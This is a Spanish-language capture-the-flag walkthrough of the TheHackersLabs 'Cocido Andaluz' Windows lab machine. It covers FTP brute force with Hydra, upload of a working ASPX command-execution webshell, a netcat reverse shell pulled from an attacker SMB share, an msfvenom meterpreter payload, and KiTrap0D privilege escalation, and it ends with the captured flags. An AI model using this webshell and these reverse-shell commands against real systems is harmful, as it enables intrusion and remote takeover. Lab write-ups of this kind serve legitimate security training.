---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cocido Andaluz (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-25 06:46 EDT
Nmap scan report for 192.168.1.153
Host is up (0.00032s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 7.0
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache2 Debian Default Page: It works
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7E:7C:98 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-JG67MIHZH2X, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7e:7c:98 (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: 16s
| smb2-time: 
|   date: 2025-03-25T10:47:54
|_  start_date: 2025-03-25T10:44:37

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.15 seconds
```

Vemos que hay un puerto `80` por lo que podemos creer que hay una pagina web alojada en dicho `Windows`, pero si entramos dentro vemos que hay un `apache2` corriendo con la pagina normal que viene por defecto, por lo que no veremos gran cosa, tambien vemos un puerto `SMB` pero vemos que es `SMBv2` por lo que no tiene ningun exploit asociado, vamos a intentar enumerar recursos compartidos de dicho `SMB` de forma anonima.

Pero veremos que no nos va a enumerar practicamente nada, por lo que tambien vemos que hay un puerto `FTP`, vamos a intentar tirar una fuerza bruta a dicho puerto con `hydra`.

## Hydra (FTP)

```shell
hydra -L <WORDLIST_USERNAMES> -P <WORDLIST_PASSWORDS> ftp://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-25 06:56:05
[DATA] max 64 tasks per 1 server, overall 64 tasks, 43048882131570 login tries (l:8295455/p:5189454), ~672638783306 tries per task
[DATA] attacking ftp://192.168.1.153:21/
[21][ftp] host: 192.168.1.153   login: info   password: PolniyPizdec0211
[STATUS] 5202059.00 tries/min, 5202059 tries in 00:01h, 43048876929511 to do in 137922:34h, 64 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Vemos que nos saco las credenciales del usuario `info` que es el usuario por defecto web de un `Windows Server` por lo que vamos a entrar al `FTP` para ver que vemos.

## FTP

```shell
ftp info@<IP>
```

Metemos como contraseña `PolniyPizdec0211` y veremos que estamos dentro, veremos lo siguiente:

```
227 Entering Passive Mode (192,168,1,153,192,11).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
```

Probamos a entrar al `welcome.png` desde la web del puerto `80`, si hacemos esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que se nos esta cargando de forma correcta, por lo que el servidor de `FTP` esta alojando la pagina web que estamos viendo desde el puerto `80` por lo que nos vamos a crear un `webshell` de extension `.aspx` ya que es un `Windows Server`.

> webshell.aspx

```aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>
```

Ahora subiremos esta pagina desde el `FTP` haciendo lo siguiente:

```shell
put webshell.aspx
```

Info:

```
local: webshell.aspx remote: webshell.aspx
227 Entering Passive Mode (192,168,1,153,192,12).
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************|   733       10.27 MiB/s    --:-- ETA
226 Transfer complete.
733 bytes sent in 00:00 (17.38 KiB/s)
```

Con esto ya estaria subido nuestra `webshell` en la pagina, por lo que si ahora ponemos en la `URL` lo siguiente:

```
URL = http://<IP>/webshell.aspx
```

Entraremos al archivo que hemos creado anteriormente y subido, por lo que si hacemos esto siguiente veremos que se esta ejecutando comandos de forma remota la servidor.

```
URL = http://<IP>/webshell.aspx?cmd=whoami
```

Info:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SMB Server

Ahora nos abriremos un servidor de `SMB` para generarnos una `reverse shell` con el servidor victima obteniendo directamente el archivo `nc.exe`.

Primero tendremos que copiarnos el ejecutable `nc.exe` a nuestro directorio actual.

```shell
cp /usr/share/windows-binaries/nc.exe .
```

Una vez copiado nuestro binario de `netcat` vamos abrirnos el servidor de `SMB`:

```shell
impacket-smbserver -smb2support kali .
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora desde la pagina de `webshell.aspx` ejecutaremos lo siguiente:

```
URL = http://<IP>/webshell.aspx?cmd=\\<IP_ATTACKER>\kali\nc.exe -e cmd <IP_ATTACKER> <PORT>
```

Con esto lo que haremos sera conectarnos a nuestro servidor de `SMB` para ejecutar el binario `nc.exe` y seguidamente estamos estableciendo una conexion a dicho `puerto` e `IP`.

Antes de enviarlo nos tendremos que poner a la escucha de la siguiente forma:

```shell
msfconsole -q
use multi/handler
set LPORT <PORT>
set LHOST <IP_ATTACKER>
run
```

Ahora si enviamos ese `payload` en el `webshell.aspx` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] Command shell session 1 opened (192.168.1.146:7777 -> 192.168.1.153:49168) at 2025-03-25 07:20:25 -0400


Shell Banner:
Microsoft Windows [Versi_n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.

c:\windows\system32\inetsrv>
-----
          

c:\windows\system32\inetsrv>whoami
whoami
nt authority\servicio de red
```

Vemos que ha funcionado de forma correcta, ahora vamos a dejar esta sesion en segundo plano realizando la combinacion de `Ctrl+Z` y despues le daremos a `Y`.

Y utilizaremos el `exploit` llamado `suggester` para ver que vulnerabilidades encuentra, pero veremos que no nos deja con la `shell` que tenemos por lo que vamos a generar un `.exe` para hacernos una `shell` con el `meterpreter` directamente y asi poder utilizar dicho modulo.

### MSFVENOM

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe > shell.exe
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Veremos que se nos ha generado de forma correcta, por lo que ahora ejecutaremos lo siguiente, como tenemos el servidor de `SMB` todavia abierto vamos a ejecutarlo desde dicho servidor:

Pero antes de nada tendremos que establecer el `PAYLOAD` del `multi/handler` de la siguiente forma:

```shell
set PAYLOAD windows/meterpreter/reverse_tcp
```

Ahora si ejecutamos eso:

```
URL = http://<IP>/webshell.aspx?cmd=\\<IP_ATTACKER>\kali\shell.exe
```

Ahora si nos vamos a donde tenemos la escucha de `metasploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] Sending stage (177734 bytes) to 192.168.1.153
[*] Meterpreter session 1 opened (192.168.1.146:7777 -> 192.168.1.153:49174) at 2025-03-25 08:17:06 -0400

meterpreter > getuid
Server username: NT AUTHORITY\Servicio de red
```

Vamos a leer la flag del usuario:

> user.txt

```
hdgrfvvf8s7dre5w7vg23rfewf
```

## Escalate Privileges

Vamos a dejarlo en segundo plano `Ctrl+Z` y dandole a `Y`, despues buscaremos lo siguiente:

```
use post/multi/recon/local_exploit_suggester
```

Lo configuraremos de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set SHOWDESCRIPTION true
exploit
```

Info:

```
[*] 192.168.1.153 - Collecting local exploits for x86/windows...
[*] 192.168.1.153 - 198 exploit checks are being tried...
[+] 192.168.1.153 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Windows Windows Server 2008 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 192.168.1.153 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 192.168.1.153 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 192.168.1.153 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 192.168.1.153 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 192.168.1.153 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
[*] Running check method for exploit 42 / 42
[*] 192.168.1.153 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Windows Windows Server 2008 build detected!                                                                                                                              
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

[*] Post module execution completed
```

Nos aparecera todo eso, veremos que ha encontrado `6` posibles vulnerabilidades, pero la que mas nos llama la atencion es la siguiente:

```
exploit/windows/local/ms10_015_kitrap0d
```

Vamos a utilizarlo haciendo lo siguiente:

```
use use exploit/windows/local/ms10_015_kitrap0d
```

Ahora lo configuraremos de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set LHOST <IP_ATTACKER>
set LPORT <PORT>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.1.146:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 2580 launched.
[*] Reflectively injecting the DLL into 2580...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.153
[*] Meterpreter session 2 opened (192.168.1.146:4444 -> 192.168.1.153:49175) at 2025-03-25 08:29:24 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Por lo que vemos ya seremos `administradores` del sistema, por lo que nos habremos pasado la maquina, leeremos la flag del `admin`.

> root.txt

```
hdgrfvv45478fhrfcdnc7vg2fw44f
```
